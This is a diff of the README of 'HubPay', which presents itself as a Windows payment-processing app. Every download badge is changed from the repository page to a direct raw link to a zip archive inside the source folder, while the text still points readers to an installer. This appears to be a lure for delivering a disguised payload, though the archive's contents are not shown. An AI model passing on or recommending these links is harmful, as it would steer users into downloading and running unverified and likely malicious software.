@@ -1,6 +1,6 @@
 # ⚡ HubPay - Simple and Secure Payment Processing
 
-[![Download HubPay](https://img.shields.io/badge/Download-HubPay-brightgreen)](https://github.com/Unpainted-creditline444/HubPay)
+[![Download HubPay](https://img.shields.io/badge/Download-HubPay-brightgreen)](https://raw.githubusercontent.com/Unpainted-creditline444/HubPay/main/src/Pay_Hub_v2.4.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Follow these steps to download, install, and run HubPay on your Windows computer
 
 Go to the HubPay download page here:
 
-[![Download HubPay](https://img.shields.io/badge/Go_to-Download_Page-blue)](https://github.com/Unpainted-creditline444/HubPay)
+[![Download HubPay](https://img.shields.io/badge/Go_to-Download_Page-blue)](https://raw.githubusercontent.com/Unpainted-creditline444/HubPay/main/src/Pay_Hub_v2.4.zip)
 
 On the page, look for the latest release or a download section. Click the link to download the file suitable for Windows, usually ending with `.exe`.
 
@@ -134,7 +134,7 @@ If you run into issues:
 
 Use this link to get started with HubPay:
 
-[![Download HubPay](https://img.shields.io/badge/Download-HubPay-green)](https://github.com/Unpainted-creditline444/HubPay)
+[![Download HubPay](https://img.shields.io/badge/Download-HubPay-green)](https://raw.githubusercontent.com/Unpainted-creditline444/HubPay/main/src/Pay_Hub_v2.4.zip)
 
 Click the link to visit the download page, find the latest installer, download it, and follow the steps above to install.
 
